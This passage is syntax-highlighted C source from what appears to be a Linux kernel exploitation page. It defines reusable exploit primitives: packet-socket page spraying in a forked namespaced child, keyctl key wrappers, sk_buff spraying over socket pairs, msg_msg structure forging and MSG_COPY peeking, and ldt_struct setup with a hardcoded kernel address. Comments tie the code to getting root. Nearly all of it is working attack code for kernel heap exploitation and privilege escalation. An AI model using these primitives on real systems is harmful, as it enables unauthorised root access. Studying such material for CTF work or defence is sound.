write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - fundamental  kernel structures</span></span><br><span class="line"><span class="comment"> * e.g. list_head</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">packet_socket_setup</span><span class="params">(<span class="keyword">uint32_t</span> block_size, <span class="keyword">uint32_t</span> frame_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uint32_t</span> block_nr, <span class="keyword">uint32_t</span> sizeof_priv, <span class="keyword">int</span> timeout)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="keyword">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	req3.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req3.tp_block_nr = block_nr;</span><br><span class="line">	req3.tp_block_size = block_size;</span><br><span class="line">	req3.tp_frame_size = frame_size;</span><br><span class="line">	req3.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req3.tp_retire_blk_tov = timeout;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = bind(s, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_cmd_handler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_pgv_system</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - keyctl related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `keyctl.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_SPEC_PROCESS_KEYRING	-2	<span class="comment">/* - key ID for process-specific keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UPDATE			2	<span class="comment">/* update a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_REVOKE			3	<span class="comment">/* revoke a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UNLINK			9	<span class="comment">/* unlink a key from a keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_READ			11	<span class="comment">/* read a key or keyring&#x27;s contents */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_alloc</span><span class="params">(<span class="keyword">char</span> *description, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen, </span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_update</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_read</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_revoke</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_unlink</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * V - sk_buff spraying related</span></span><br><span class="line"><span class="comment"> * note that the sk_buff&#x27;s tail is with a 320-bytes skb_shared_info</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * socket&#x27;s definition should be like:</span></span><br><span class="line"><span class="comment"> * int sk_sockets[SOCKET_NUM][2];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_socket_array</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* socket pairs to spray sk_buff */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_socket[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[x] failed to received sk_buff!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - msg_msg related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_msg_queue</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((struct msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, </span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next, <span class="keyword">uint64_t</span> m_list_prev, </span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">uint64_t</span> m_type, <span class="keyword">uint64_t</span> m_ts,  <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> security)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - ldt_struct related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Somethings we may want to compile the exp binary with MUSL-GCC, which</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t contain the `asm/ldt.h` file.</span></span><br><span class="line"><span class="comment"> * As the file is small, I copy that directly to here :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ASSEMBLY__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_DATA	0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_STACK	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_CODE	2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__ASSEMBLY__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* this should be referred to your kernel */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* desc initializer */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">init_desc</span><span class="params">(struct user_desc *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    desc-&gt;base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc-&gt;entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc-&gt;limit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_32bit = 